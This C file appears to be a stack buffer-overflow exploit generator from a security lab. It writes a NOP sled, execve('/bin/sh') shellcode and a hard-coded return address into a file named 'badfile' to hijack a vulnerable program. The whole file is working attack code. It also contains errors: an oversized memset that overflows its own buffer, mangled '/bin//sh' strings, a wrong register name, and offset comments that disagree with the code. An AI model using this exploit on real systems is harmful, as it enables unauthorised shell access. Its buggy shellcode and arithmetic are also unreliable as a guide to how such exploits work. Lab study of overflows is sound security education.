#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] = 
        "\x31\xc0"      // xorl   %eax, %eax
        "\x50"          // pushl  %eax
        "\x68" "\\sh"   // pushl  $0x68732f2f
        "\x68" "\bin"   // pushl  $0x6e69622f
        "\x89\xe3"      // movl   %esp, %sbx
        "\x50"          // pushl  %eax
        "\x53"          // pushl  %ebx
        "\x89\xe1"      // movl   %esp, %ecx
        "\x99"          // cdq
        "\xb0\x0b"      // movb   $0x0b, %al
        "\xcd\x80"      // int    $0x80      - invoke execve()
;

int main(int argc, char **argv)
{
    char buf[517];
    FILE *badfile;
    int start;
    char ret[] = "\x81\xd4\xff\xff"; // ebp: 0xffffd388
    int offset;

    memset(&buf, 0x90, 571); // NOP

    // Put the shellcode at the end
    start = 517 - strlen(shellcode); // 493 = 517 - 24
    memcpy(buf+start, shellcode, strlen(shellcode));

    // Put the address at offset 24
    offset = 24; // 0xffffd388 - 0xffffd374 = 20
    memcpy(buf+offset, ret, strlen(ret));

    badfile = fopen("./badfile", "w");
    fwrite(buf, 517, 1, badfile);
    fclose(badfile);

    return 0;
}